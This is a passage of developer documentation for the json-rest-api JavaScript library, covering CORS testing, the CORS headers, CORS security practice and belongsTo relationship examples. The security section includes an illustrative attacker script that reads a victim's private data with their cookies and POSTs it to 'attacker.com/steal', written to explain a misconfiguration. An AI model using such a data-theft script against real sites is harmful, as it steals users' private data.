    console.log('CORS Debug:', {
      requestOrigin: request.headers.origin,
      responseHeaders: {
        'Access-Control-Allow-Origin': response.headers['Access-Control-Allow-Origin'],
        'Access-Control-Allow-Credentials': response.headers['Access-Control-Allow-Credentials']
      },
      allowed: !!response.headers['Access-Control-Allow-Origin']
    });
  }
);
```

### Testing CORS

**Understanding CORS Testing**

CORS is enforced by browsers, not servers. This creates interesting testing scenarios:
- **cURL/Postman**: Requests always work (no CORS enforcement)
- **Browser**: Requests blocked if CORS headers are wrong
- **Server**: Always sends CORS headers, doesn't block requests

**What These Tests Check:**

1. **Server sends correct headers** (not whether requests are blocked)
2. **Preflight responses** have right status codes
3. **Dynamic origin validation** works correctly

**Testing Assumptions:**
These examples assume:
- API running on `http://localhost:3000`
- Testing origin `https://example.com`
- Default CORS configuration (allows all origins)

**Example using cURL:**

```bash
# Test preflight request
curl -X OPTIONS http://localhost:3000/api/articles \
  -H "Origin: https://example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v

# Test actual request
curl -X GET http://localhost:3000/api/articles \
  -H "Origin: https://example.com" \
  -v
```

**What to Look For in Preflight Response:**
```
< HTTP/1.1 204 No Content
< Access-Control-Allow-Origin: https://example.com
< Access-Control-Allow-Methods: GET, POST, PUT, PATCH, DELETE, OPTIONS
< Access-Control-Allow-Headers: Content-Type, Authorization, ...
< Access-Control-Max-Age: 86400
< Access-Control-Allow-Credentials: true
< Vary: Origin
```

**What to Look For in Regular Response:**
```
< HTTP/1.1 200 OK
< Access-Control-Allow-Origin: https://example.com
< Access-Control-Allow-Credentials: true
< Access-Control-Expose-Headers: X-Total-Count, X-Page-Count, Link
< Vary: Origin
< Content-Type: application/vnd.api+json
```

**Important Testing Notes:**

1. **cURL Always Succeeds** - Even with wrong CORS headers:
   ```bash
   # This works in cURL but fails in browser
   curl -X GET http://localhost:3000/api/articles \
     -H "Origin: https://blocked-site.com"
   ```

2. **Browser Testing is Required** for real CORS validation:
   ```javascript
   // In browser console (will fail if CORS is wrong)
   fetch('http://localhost:3000/api/articles')
     .then(r => r.json())
     .then(console.log)
     .catch(e => console.error('CORS Error:', e));
   ```

3. **Credentials Make a Difference**:
   ```bash
   # Without credentials (works with wildcard)
   curl -X OPTIONS http://localhost:3000/api/articles \
     -H "Origin: https://any-site.com" \
     -H "Access-Control-Request-Method: GET"
   
   # With credentials (needs specific origin)
   curl -X OPTIONS http://localhost:3000/api/articles \
     -H "Origin: https://any-site.com" \
     -H "Access-Control-Request-Method: GET" \
     -H "Cookie: session=abc123"
   ```

### Browser DevTools

In Chrome/Firefox DevTools:
1. Network tab → Find the request
2. Check Response Headers for CORS headers
3. For failed requests, check Console for CORS errors

### Common CORS Headers Explained

**Understanding Each CORS Header in Detail**

#### Core CORS Headers

| Header | Purpose | Example |
| `Access-Control-Allow-Origin` | **The Most Important Header** - Tells browser which origin can access the response | `https://app.example.com` or `*` |

**Deep Dive: Access-Control-Allow-Origin**
- Single origin: `Access-Control-Allow-Origin: https://app.example.com`
- Wildcard: `Access-Control-Allow-Origin: *` (not allowed with credentials)
- Dynamic: Server echoes the request's Origin if allowed
- Missing: Browser blocks the response

**Common Mistakes:**
```javascript
// WRONG - Multiple origins in header
response.headers['Access-Control-Allow-Origin'] = 'https://a.com, https://b.com';

// RIGHT - Echo the allowed origin
if (allowedOrigins.includes(request.headers.origin)) {
  response.headers['Access-Control-Allow-Origin'] = request.headers.origin;
}
```
| `Access-Control-Allow-Credentials` | **Security Critical** - Allows browser to include cookies and auth headers | `true` |

**Deep Dive: Access-Control-Allow-Credentials**
- Only valid value is `true` (or omit header)
- Forces origin to be specific (no wildcard)
- Required for:
  - Cookie-based sessions
  - HTTP authentication
  - Client certificates

**Security Impact:**
```javascript
// DANGEROUS - Never do this
response.headers['Access-Control-Allow-Origin'] = '*';
response.headers['Access-Control-Allow-Credentials'] = 'true';
// Browsers will reject this combination

// SECURE - Specific origin with credentials
response.headers['Access-Control-Allow-Origin'] = 'https://app.example.com';
response.headers['Access-Control-Allow-Credentials'] = 'true';
```
| `Access-Control-Allow-Methods` | **Preflight Only** - Lists which HTTP methods are allowed | `GET, POST, PUT, DELETE, OPTIONS` |

**Deep Dive: Access-Control-Allow-Methods**
- Only sent in preflight responses (OPTIONS)
- Lists all methods the client can use
- Case-sensitive (use uppercase)
- Must include the requested method

**Example Scenarios:**
```javascript
// Read-only API
headers['Access-Control-Allow-Methods'] = 'GET, OPTIONS';

// Full CRUD API
headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, PATCH, DELETE, OPTIONS';

// Custom methods
headers['Access-Control-Allow-Methods'] = 'GET, POST, PURGE, OPTIONS';
```
| `Access-Control-Allow-Headers` | **Preflight Only** - Lists headers the client can include | `Content-Type, Authorization, X-Requested-With` |

**Deep Dive: Access-Control-Allow-Headers**
- Only in preflight responses
- Must include all headers the client will send
- Some headers are always allowed ("simple headers")
- Case-insensitive

**Simple Headers (always allowed):**
- `Accept`
- `Accept-Language`
- `Content-Language`
- `Content-Type` (only for simple values)

**Headers That Need Permission:**
```javascript
// API using various auth methods
headers['Access-Control-Allow-Headers'] = [
  'Authorization',      // Bearer tokens
  'X-API-Key',         // API keys
  'X-CSRF-Token',      // CSRF protection
  'Content-Type',      // For JSON payloads
  'X-Requested-With'   // AJAX detection
].join(', ');
```
| `Access-Control-Expose-Headers` | **Response Only** - Makes custom headers readable to JavaScript | `X-Total-Count, X-RateLimit-Remaining` |

**Deep Dive: Access-Control-Expose-Headers**
- By default, JS can only read "simple response headers"
- This header exposes additional headers
- Only affects what JavaScript can read
- The network tab shows all headers regardless

**Default Readable Headers:**
- `Cache-Control`
- `Content-Language`
- `Content-Type`
- `Expires`
- `Last-Modified`
- `Pragma`

**Common Custom Headers to Expose:**
```javascript
headers['Access-Control-Expose-Headers'] = [
  // Pagination
  'X-Total-Count',
  'X-Page-Count',
  'Link',
  
  // Rate Limiting
  'X-RateLimit-Limit',
  'X-RateLimit-Remaining',
  'X-RateLimit-Reset',
  
  // API Info
  'X-Response-Time',
  'X-Request-ID'
].join(', ');
```
| `Access-Control-Max-Age` | **Performance** - How long browser can cache preflight | `86400` (24 hours) |

**Deep Dive: Access-Control-Max-Age**
- Reduces preflight requests
- Value in seconds
- Browser maximum varies (Chrome: 2 hours, Firefox: 24 hours)
- Set lower during development

**Optimization Strategies:**
```javascript
// Development - quick changes
headers['Access-Control-Max-Age'] = '60'; // 1 minute

// Staging - moderate caching
headers['Access-Control-Max-Age'] = '3600'; // 1 hour

// Production - maximum caching
headers['Access-Control-Max-Age'] = '86400'; // 24 hours
```
| `Vary` | **Caching Hint** - Tells proxies/CDNs response varies by Origin | `Origin` |

**Deep Dive: Vary Header**
- Critical for CDNs and proxies
- Prevents wrong CORS headers being cached
- Should always include `Origin` when CORS headers vary

**Why It Matters:**
```javascript
// Without Vary: Origin
// 1. CDN caches response for https://a.com
// 2. Request from https://b.com gets cached response
// 3. Browser sees wrong Access-Control-Allow-Origin

// With Vary: Origin
// CDN caches separate responses per origin
response.headers['Vary'] = 'Origin';
```

#### Additional CORS Headers

| Header | Purpose | When Used |
|--------|---------|--------|
| `Access-Control-Request-Method` | **Request** - Asks permission for HTTP method | Preflight requests |
| `Access-Control-Request-Headers` | **Request** - Asks permission for headers | Preflight requests |
| `Origin` | **Request** - Identifies requesting origin | All CORS requests |

**Preflight Request Flow:**
```
Browser → Server:
  OPTIONS /api/users
  Origin: https://app.example.com
  Access-Control-Request-Method: POST
  Access-Control-Request-Headers: Content-Type, X-API-Key

Server → Browser:
  204 No Content
  Access-Control-Allow-Origin: https://app.example.com
  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
  Access-Control-Allow-Headers: Content-Type, X-API-Key
  Access-Control-Max-Age: 86400
```

## Security Considerations

CORS is a security feature, but misconfiguration can create vulnerabilities. Here's what you need to know:

### 1. Never Use Wildcard with Credentials

**The Rule:** When `credentials: true`, you MUST specify exact origins, never use `*`.

**Why This Matters:**
```javascript
// VULNERABLE - This configuration is dangerous
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: '*',
    credentials: true  // Browser will reject this!
  }
});
```

**What Could Happen:**
If browsers allowed this:
1. Evil site `https://attacker.com` loads in user's browser
2. User is logged into your API (has auth cookie)
3. Evil site makes request to your API
4. Browser would send user's cookies
5. Attacker gets user's private data

**The Safe Way:**
```javascript
// SECURE - Explicit origins only
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: ['https://app.mycompany.com', 'https://admin.mycompany.com'],
    credentials: true
  }
});
```

**Real Attack Example:**
```html
<!-- On attacker.com -->
<script>
// If wildcard+credentials worked, this would steal user data
fetch('https://api.yourcompany.com/user/private-data', {
  credentials: 'include'  // Would send victim's cookies
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```
### 2. Validate Origins Against a Whitelist

**The Rule:** Never trust user input. Always validate origins against known good values.

**Why This Matters:**
The `Origin` header comes from the browser, but:
- Can be spoofed in non-browser requests
- Might contain unexpected values
- Could be used for reconnaissance

**Bad Example - Dangerous Pattern:**
```javascript
// NEVER DO THIS - Accepts any origin
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      return true; // Accepts everything!
    }
  }
});

// ALSO BAD - Weak validation
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      return origin.includes('mycompany'); // subdomain.mycompany.evil.com would pass!
    }
  }
});
```

**Good Example - Secure Validation:**
```javascript
// SECURE - Whitelist approach
const allowedOrigins = new Set([
  'https://app.mycompany.com',
  'https://admin.mycompany.com',
  'https://staging.mycompany.com'
]);

await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: (origin) => {
      // Strict whitelist check
      if (allowedOrigins.has(origin)) {
        return true;
      }
      
      // Log rejected attempts
      console.warn('CORS: Rejected origin:', origin);
      return false;
    }
  }
});

// SECURE - Database-driven whitelist
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: async (origin) => {
      const allowed = await db('allowed_origins')
        .where({ origin, active: true })
        .first();
      
      if (!allowed) {
        // Security event logging
        await db('security_events').insert({
          type: 'cors_rejection',
          origin,
          timestamp: new Date(),
          ip: requestIp // If available
        });
      }
      
      return !!allowed;
    }
  }
});
```

**Advanced Pattern Recognition:**
```javascript
// Be careful with patterns
const secureOriginValidator = (origin) => {
  // Prevent subdomain takeover attacks
  const parsed = new URL(origin);
  
  // Must be HTTPS
  if (parsed.protocol !== 'https:') return false;
  
  // Check against allowed patterns
  const allowedPatterns = [
    /^https:\/\/[a-z0-9-]+\.mycompany\.com$/,  // Subdomains
    /^https:\/\/localhost:\d+$/  // Local dev only
  ];
  
  return allowedPatterns.some(pattern => pattern.test(origin));
};
```
### 3. Limit Exposed Headers

**The Rule:** Only expose headers that client applications actually need to read.

**Why This Matters:**
Exposed headers can leak information:
- Internal system details
- User information
- Infrastructure details
- Security tokens

**Bad Example - Over-Exposure:**
```javascript
// TOO MUCH INFORMATION
await api.use(CorsPlugin, {
  'rest-api-cors': {
    exposedHeaders: [
      'X-Powered-By',           // Reveals server technology
      'X-Server-Instance',      // Infrastructure details
      'X-Internal-Request-ID',  // Internal tracking
      'X-Database-Query-Time',  // Performance details
      'X-User-Internal-ID',     // Internal user IDs
      'X-Debug-Info'            // Debug information
    ]
  }
});
```

**Good Example - Minimal Exposure:**
```javascript
// SECURE - Only what's needed
await api.use(CorsPlugin, {
  'rest-api-cors': {
    exposedHeaders: [
      // Pagination - needed for UI
      'X-Total-Count',
      'Link',
      
      // Rate limiting - needed for client backoff
      'X-RateLimit-Remaining',
      'X-RateLimit-Reset'
      
      // Nothing else!
    ]
  }
});
```

**Security Headers to Never Expose:**
```javascript
// NEVER expose these headers
const dangerousHeaders = [
  'X-Internal-User-Role',     // Internal permissions
  'X-Session-Token',          // Session identifiers
  'X-Database-Connection',    // Infrastructure
  'X-Internal-Error-Details', // Stack traces
  'X-Employee-ID',            // Internal IDs
  'X-AWS-Request-ID'          // Cloud provider details
];
```

**Dynamic Header Exposure:**
```javascript
// Expose different headers based on user role
api.addHook('transport:response', 'dynamic-expose', async ({ context, response }) => {
  const userRole = context.user?.role;
  
  if (userRole === 'developer') {
    // Developers get debug headers
    response.headers['Access-Control-Expose-Headers'] += ', X-Query-Time, X-Cache-Status';
  } else {
    // Regular users get minimal headers
    response.headers['Access-Control-Expose-Headers'] = 'X-Total-Count';
  }
});
```
### 4. Always Use HTTPS in Production

**The Rule:** CORS is not a replacement for HTTPS. Always use HTTPS in production.

**Why This Matters:**
CORS only controls which websites can access your API from a browser. It doesn't:
- Encrypt data in transit
- Prevent man-in-the-middle attacks
- Authenticate the server
- Protect against network sniffing

**What CORS Does vs What HTTPS Does:**

| Security Aspect | CORS | HTTPS |
|----------------|------|-------|
| Prevents malicious websites | ✅ | ❌ |
| Encrypts data in transit | ❌ | ✅ |
| Authenticates server identity | ❌ | ✅ |
| Prevents MITM attacks | ❌ | ✅ |
| Protects cookies | Partial | ✅ |

**Production Configuration:**
```javascript
// SECURE - HTTPS only in production
if (process.env.NODE_ENV === 'production') {
  // Enforce HTTPS origins only
  await api.use(CorsPlugin, {
    'rest-api-cors': {
      origin: (origin) => {
        if (!origin.startsWith('https://')) {
          console.warn('Rejected non-HTTPS origin:', origin);
          return false;
        }
        return allowedOrigins.includes(origin);
      }
    }
  });
  
  // Also enforce secure cookies
  app.use(session({
    cookie: {
      secure: true,      // HTTPS only
      httpOnly: true,    // No JS access
      sameSite: 'strict' // CSRF protection
    }
  }));
}
```

**Common HTTPS + CORS Issues:**
```javascript
// Mixed content problems
// If API is HTTPS but allows HTTP origins:
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: [
      'https://app.example.com',  // Good
      'http://app.example.com'    // Bad - browser may block
    ]
  }
});

// Solution: Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});
```
### 5. Regular Security Audits

**The Rule:** Periodically review and audit your CORS configuration to remove unused origins and tighten security.

**Why This Matters:**
- Old partner domains might be compromised
- Development/staging URLs might leak to production
- Subdomain takeover attacks
- Accumulated technical debt

**Audit Checklist:**

```javascript
// 1. Log and monitor origin usage
const originStats = new Map();

api.addHook('transport:request', 'origin-monitor', async ({ request }) => {
  const origin = request.headers.origin;
  if (origin) {
    const stats = originStats.get(origin) || { count: 0, lastSeen: null };
    stats.count++;
    stats.lastSeen = new Date();
    originStats.set(origin, stats);
  }
});

// 2. Regular audit function
async function auditCorsOrigins(corsConfig) {
  console.log('=== CORS Origin Audit ===');
  
  // Check configured origins
  console.log('Configured origins:', corsConfig.origin);
  
  // Show usage stats
  console.log('\nOrigin Usage (last 30 days):');
  for (const [origin, stats] of originStats) {
    console.log(`${origin}: ${stats.count} requests, last: ${stats.lastSeen}`);
  }
  
  // Check for unused origins
  const unusedDays = 30;
  const cutoff = new Date(Date.now() - unusedDays * 24 * 60 * 60 * 1000);
  
  console.log('\nPotentially unused origins:');
  for (const [origin, stats] of originStats) {
    if (stats.lastSeen < cutoff) {
      console.log(`${origin} - Last used: ${stats.lastSeen}`);
    }
  }
}

// 3. Run monthly
setInterval(auditCorsOrigins, 30 * 24 * 60 * 60 * 1000);
```

**Automated Security Checks:**
```javascript
// Check for subdomain takeover risks
async function checkSubdomainTakeover(corsConfig) {
  const origins = Array.isArray(corsConfig.origin) ? corsConfig.origin : [corsConfig.origin];
  
  for (const origin of origins) {
    try {
      const url = new URL(origin);
      const response = await fetch(url.origin);
      
      // Check if domain still points to your infrastructure
      if (!response.ok || !response.headers.get('x-your-app')) {
        console.error(`SECURITY RISK: ${origin} may be compromised`);
        // Send alert to security team
      }
    } catch (error) {
      console.error(`Cannot verify ${origin}: ${error.message}`);
    }
  }
}
```

**Origin Management Best Practices:**
```javascript
// Track allowed origins in your configuration
const corsOrigins = {
  production: [
    'https://app.example.com',
    'https://admin.example.com'
  ],
  staging: [
    'https://staging.example.com',
    'https://preview.example.com'
  ],
  development: '*'
};

// Use environment-based configuration
await api.use(CorsPlugin, {
  'rest-api-cors': {
    origin: corsOrigins[process.env.NODE_ENV] || corsOrigins.development
  }
});

// To add or remove origins, update the configuration and restart the server
// This ensures all server instances have consistent CORS settings
```

**Security Alerts:**
```javascript
// Alert on suspicious patterns
api.addHook('transport:request', 'security-alert', async ({ request }) => {
  const origin = request.headers.origin;
  
  // Check for suspicious patterns
  if (origin && (
    origin.includes('ngrok.io') ||
    origin.includes('localhost.run') ||
    origin.includes('.local') ||
    origin.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
  )) {
    console.warn('SECURITY ALERT: Suspicious origin detected:', origin);
    // Send to security monitoring
  }
});
```
# Data and relations

The true power of json-rest-api lies in its sophisticated handling of relationships between resources. Unlike traditional ORMs that focus on object mapping, this library provides a fully JSON:API compliant REST interface that elegantly manages complex data relationships. This guide will walk you through defining datasets and explore all the possible relationship types available in the system.

This guide has been split into the following sections for easier navigation:

## [2.1 The starting point](./GUIDE_2_1_The_Starting_Point.md)
- Basic setup and configuration
- Creating the API instance
- Setting up the database connection

## [2.2 Manipulating and searching tables with no relationships](./GUIDE_2_2_Manipulating_And_Searching_Tables.md)
- Setting up schemas
- Basic CRUD operations (POST, GET, PATCH, PUT)
- Search and filtering capabilities
- Multi-word search with AND logic
- Custom search functions
- Sparse fieldsets

## [2.3 `belongsTo` Relationships](./GUIDE_2_3_BelongsTo_Relationships.md)
- Understanding belongsTo relationships
- Including related records
- Sparse fieldsets with belongsTo relations
- Filtering by belongsTo relationships

## [2.4 hasMany records](./GUIDE_2_4_HasMany_Records.md)
- Understanding hasMany relationships
- Including hasMany records
- Filtering by hasMany relationships
- Cross-table searches

## [2.5 hasMany records (polymorphic)](./GUIDE_2_5_HasMany_Polymorphic.md)
- Understanding polymorphic relationships
- Including polymorphic records
- Forward and reverse polymorphic search
- Complex polymorphic filtering

## [2.6 Many to many (hasMany with through records)](./GUIDE_2_6_Many_To_Many.md)
- Understanding many-to-many relationships
- Working with pivot tables directly
- Including many-to-many records
- Search across many-to-many relationships

## [2.7 Pagination and ordering](./GUIDE_2_7_Pagination_And_Ordering.md)
- Offset-based vs cursor-based pagination
- Sorting and multi-field sorting
- Limits and ordering for included relationships
- Combining filters, sorting, pagination, and includes

## [2.8 Effects of PUT and PATCH](./GUIDE_2_8_Effects_of_PUT_and_PATCH.md)
- Understanding the difference between PUT and PATCH
- How PUT affects relationships (complete replacement)
- How PATCH affects relationships (partial updates)
- Managing belongsTo relationships
- Handling hasMany relationships
- Working with many-to-many relationships

## [2.9 Relationships URLs](./GUIDE_2_9_Relationships_Urls.md)
- Working with relationship endpoints
- Direct relationship manipulation
- Relationship links and meta information
- Managing relationship collections

---

[Back to Guide](./index.md)# 2.1 The starting point

```javascript
import { RestApiPlugin, RestApiKnexPlugin, ExpressPlugin } from 'json-rest-api'; // Added: ExpressPlugin
import { Api } from 'hooked-api';
import knexLib from 'knex';
import util from 'util';
import express from 'express'; // Added: Express

// Utility used throughout this guide
const inspect = (obj) => util.inspect(obj, { depth: 8 })

// Create a Knex instance connected to SQLite in-memory database
const knex = knexLib({
  client: 'better-sqlite3',
  connection: {
    filename: ':memory:'
  },
  useNullAsDefault: true
});

// Create API instance
const api = new Api({ name: 'book-catalog-api' });

// Install plugins
await api.use(RestApiPlugin); // URLs auto-detected
await api.use(RestApiKnexPlugin, { knex });
await api.use(ExpressPlugin, {  mountPath: '/api' }); // Added: Express Plugin

/// *** ...programmatic calls here... ***

// Create the express server and add the API's routes 
const app = express();
app.use(api.http.express.router);
app.use(api.http.express.notFoundRouter);

app.listen(3000, () => {
  console.log('Express server started on port 3000. API available at http://localhost:3000/api');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});
```

Note that every time we provide a snippet of code, it will be assumed that

1. The script is edited in the section `/// *** ...programmatic calls here... ***`
2. The code is stopped with CTRL-C and then restarted. 
3. The core proposed in each snippet _replaces_ the code provided earlier.

This will ensure that each example has a fresh start.

Each example will be introduced programmatically first, and then via HTTP. The HTTP calls will be run assuming that the API calls (and any data created with them) stay. The use of the in-memory database will be assumed, which means that the data will start afresh each time.

---

[Back to Guide](./README.md) | [Next: 2.2 Manipulating and searching tables with no relationships](./GUIDE_2_2_Manipulating_And_Searching_Tables.md)# 2.3 `belongsTo` Relationships

`belongsTo` relationships represent a one-to-one or many-to-one association where the current resource "belongs to" another resource. For example, a `book` belongs to an `author`, or an `author` belongs to a `country`. These relationships are typically managed by a **foreign key** on the "belonging" resource's table.

Let's expand our schema definitions to include `publishers` and link them to `countries`. These schemas will be defined **once** here and reused throughout this section.

```javascript
// Define countries resource
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    code: { type: 'string', max: 2, unique: true, search: true, indexed: true },
  }
});
await api.resources.countries.createKnexTable();

// Define publishers resource
await api.addResource('publishers', {
  schema: {
    name: { type: 'string', required: true, max: 255 },
    country_id: { type: 'id', belongsTo: 'countries', as: 'country', nullable: true }
  },
  // searchSchema completely defines all filterable fields for this resource
  searchSchema: {
    name: { type: 'string' },
    country: { type: 'id', actualField: 'country_id', nullable: true },
    countryCode: { type: 'string', actualField: 'countries.code' }
  }
});
await api.resources.publishers.createKnexTable();
```

Now, let's add some data. Notice the flexibility of using either the foreign key field `country_id` or the relationship alias `country` when linking a publisher to a country in simplified mode.

```javascript
const france = await api.resources.countries.post({ name: 'France', code: 'FR' });
const germany = await api.resources.countries.post({ name: 'Germany', code: 'DE' });
const uk = await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });

// Create a publisher linking via the relationship alias (simplified syntax)
const frenchPublisher = await api.resources.publishers.post({
  name: 'French Books Inc.',
  country: france.id
});

// Create a publisher linking via the foreign key field directly
const germanPublisher = await api.resources.publishers.post({
  name: 'German Press GmbH',
  country_id: germany.id
});

const ukPublisher = await api.resources.publishers.post({
  name: 'UK Books Ltd.',
  country: uk.id
});

const internationalPublisher = await api.resources.publishers.post({
  name: 'Global Publishing',
  country_id: null
});


console.log('Added French Publisher:', inspect(frenchPublisher));
console.log('Added German Publisher:', inspect(germanPublisher));
console.log('Added UK Publisher:', inspect(ukPublisher));
console.log('Added International Publisher:', inspect(internationalPublisher));
```

**Explanation of Interchangeability (`country_id` vs. `country`):**

When defining a `belongsTo` relationship with an `as` alias (e.g., `country_id: { ..., as: 'country' }`), `json-rest-api` provides flexibility in how you provide the related resource's ID during `post`, `put`, or `patch` operations in **simplified mode**:

* You can use the **relationship alias** (the `as` value) directly with the ID of the related resource (e.g., `country: france.id`). This is generally recommended for clarity and aligns with the relationship concept.
* You can use the direct **foreign key field name** (e.g., `country_id: germany.id`). The system is flexible enough to recognize this as a foreign key and process it correctly.

Both approaches achieve the same result of setting the underlying foreign key in the database.

**Expected Output (Illustrative, IDs may vary):**

```text
Added French Publisher: { id: '1', name: 'French Books Inc.', country_id: '1' }
Added German Publisher: { id: '2', name: 'German Press GmbH', country_id: '2' }
Added UK Publisher: { id: '3', name: 'UK Books Ltd.', country_id: '3' }
Added International Publisher: { id: '4', name: 'Global Publishing', country_id: null }
```

## Including `belongsTo` Records (`include`)

To retrieve related `belongsTo` resources, use the `include` query parameter.

When fetching data programmatically, `simplified` mode is `true` by default. This means that instead of a separate `included` array (as in full JSON:API), related `belongsTo` resources are **denormalized and embedded directly** within the main resource's object structure, providing a very convenient and flat data structure for immediate use.

### Programmatic Usage:

```javascript
// Re-add data for a fresh start (schemas are reused from above)
const france = await api.resources.countries.post({ name: 'France', code: 'FR' });
const germany = await api.resources.countries.post({ name: 'Germany', code: 'DE' });
const uk = await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });

await api.resources.publishers.post({ name: 'French Books Inc.', country: france.id });
await api.resources.publishers.post({ name: 'Another French Books Inc.', country: france.id });
await api.resources.publishers.post({ name: 'UK Books Ltd.', country: uk.id });
await api.resources.publishers.post({ name: 'German Press GmbH', country_id: germany.id });
await api.resources.publishers.post({ name: 'Global Publishing', country_id: null });

await api.resources.publishers.post({ 
  name: 'UK Books Ltd.', 
  country: uk.id 
});


// Get a publisher and include its country (simplified mode output)
const publisherWithCountry = await api.resources.publishers.get({
  id: '1', // ID of French Books Inc.
  queryParams: {
    include: ['country'] // Use the 'as' alias defined in the schema
  }
});
console.log('Publisher with Country:', inspect(publisherWithCountry));

// Query all publishers and include their countries (simplified mode output)
const allPublishersWithCountries = await api.resources.publishers.query({
  queryParams: {
    include: ['country']
  }
});
// HTTP: GET /api/publishers?include=country
// Returns (simplified): [
//   { id: '1', name: 'French Books Inc.', country_id: '1', country: { id: '1', name: 'France', code: 'FR' } },
//   { id: '2', name: 'German Press GmbH', country_id: '2', country: { id: '2', name: 'Germany', code: 'DE' } },
//   { id: '3', name: 'UK Books Ltd.', country_id: '3', country: { id: '3', name: 'United Kingdom', code: 'UK' } },
//   { id: '4', name: 'Global Publishing', country_id: null, country: null }
// ]

console.log('All Publishers with Countries:', inspect(allPublishersWithCountries));
// Note: allPublishersWithCountries contains { data, meta, links }

// Query all publishers and include their countries (JSON:API format)
const allPublishersWithCountriesNotSimplified = await api.resources.publishers.query({
  queryParams: {
    include: ['country']
  },
  simplified: false
});
// HTTP: GET /api/publishers?include=country
// Returns (JSON:API): {
//   data: [
//     { type: 'publishers', id: '1', attributes: { name: 'French Books Inc.' }, 
//       relationships: { country: { data: { type: 'countries', id: '1' } } } },
//     { type: 'publishers', id: '2', attributes: { name: 'German Press GmbH' }, 
//       relationships: { country: { data: { type: 'countries', id: '2' } } } },
//     { type: 'publishers', id: '3', attributes: { name: 'UK Books Ltd.' }, 
//       relationships: { country: { data: { type: 'countries', id: '3' } } } },
//     { type: 'publishers', id: '4', attributes: { name: 'Global Publishing' }, 
//       relationships: { country: { data: null } } }
//   ],
//   included: [
//     { type: 'countries', id: '1', attributes: { name: 'France', code: 'FR' } },
//     { type: 'countries', id: '2', attributes: { name: 'Germany', code: 'DE' } },
//     { type: 'countries', id: '3', attributes: { name: 'United Kingdom', code: 'UK' } }
//   ]
// }

console.log('All Publishers with Countries (not simplified):', inspect(allPublishersWithCountriesNotSimplified));
```

Here is the expected output. Notice how the last call shows the non-simplified version of the response, which is muc more verbose. However, it has one _major_ advantage: it only includes the information about France _once_. It might seem like a small gain here, but when you have complex queries where the `belongsTo` table has a lot of data, the saving is much more evident.

**Expected Output**

```text
Publisher with Country: {
  id: '1',
  name: 'French Books Inc.',
  country_id: '1',
  country: { id: '1', name: 'France', code: 'FR' }
}
All Publishers with Countries: {
  data: [
    {
      id: '1',
      name: 'French Books Inc.',
      country_id: '1',
      country: { id: '1', name: 'France', code: 'FR' }
    },
    {
      id: '2',
      name: 'Another French Books Inc.',
      country_id: '1',
      country: { id: '1', name: 'France', code: 'FR' }
    },
    {
      id: '3',
      name: 'UK Books Ltd.',
    country_id: '3',
    country: { id: '3', name: 'United Kingdom', code: 'UK' }
  },
  {
    id: '4',
    name: 'German Press GmbH',
    country_id: '2',
    country: { id: '2', name: 'Germany', code: 'DE' }
  },
    { id: '5', name: 'Global Publishing' }
  ],
  meta: {...},
  links: {...}
}
All Publishers with Countries (not simplified): {
  data: [
    {
      type: 'publishers',
      id: '1',
      attributes: { name: 'French Books Inc.' },
      relationships: {
        country: {
          data: { type: 'countries', id: '1' },
          links: {
            self: '/api/publishers/1/relationships/country',
            related: '/api/publishers/1/country'
          }
        }
      },
      links: { self: '/api/publishers/1' }
    },
    {
      type: 'publishers',
      id: '2',
      attributes: { name: 'Another French Books Inc.' },
      relationships: {
        country: {
          data: { type: 'countries', id: '1' },
          links: {
            self: '/api/publishers/2/relationships/country',
            related: '/api/publishers/2/country'
          }
        }
      },
      links: { self: '/api/publishers/2' }
    },
    {
      type: 'publishers',
      id: '3',
      attributes: { name: 'UK Books Ltd.' },
      relationships: {
        country: {
          data: { type: 'countries', id: '3' },
          links: {
            self: '/api/publishers/3/relationships/country',
            related: '/api/publishers/3/country'
          }
        }
      },
      links: { self: '/api/publishers/3' }
    },
    {
      type: 'publishers',
      id: '4',
      attributes: { name: 'German Press GmbH' },
      relationships: {
        country: {
          data: { type: 'countries', id: '2' },
          links: {
            self: '/api/publishers/4/relationships/country',
          related: '/api/publishers/4/country'
        }
      },
      links: { self: '/api/publishers/4' }
    },
    {
      type: 'publishers',
      id: '5',
      attributes: { name: 'Global Publishing' },
      relationships: {
        country: {
          data: null,
          links: {
            self: '/api/publishers/5/relationships/country',
            related: '/api/publishers/5/country'
          }
        }
      },
      links: { self: '/api/publishers/5' }
    }
  ],
  included: [
    {
      type: 'countries',
      id: '1',
      attributes: { name: 'France', code: 'FR' },
      relationships: {},
      links: { self: '/api/countries/1' }
    },
    {
      type: 'countries',
      id: '3',
      attributes: { name: 'United Kingdom', code: 'UK' },
      relationships: {},
      links: { self: '/api/countries/3' }
    },
    {
      type: 'countries',
      id: '2',
      attributes: { name: 'Germany', code: 'DE' },
      relationships: {},
      links: { self: '/api/countries/2' }
    }
  ],
  links: { self: '/api/publishers?include=country' }
}
```

---

## Sparse Fieldsets with `belongsTo` Relations

You can apply **sparse fieldsets** not only to the primary resource but also to the included `belongsTo` resources. This is powerful for fine-tuning your API responses and reducing payload sizes.

### Programmatic Usage:

```javascript
// Re-add data for a fresh start (schemas are reused from above)

const france = await api.resources.countries.post({ name: 'France', code: 'FR' });
const germany = await api.resources.countries.post({ name: 'Germany', code: 'DE' });
const uk = await api.resources.countries.post({ name: 'United Kingdom', code: 'UK' });

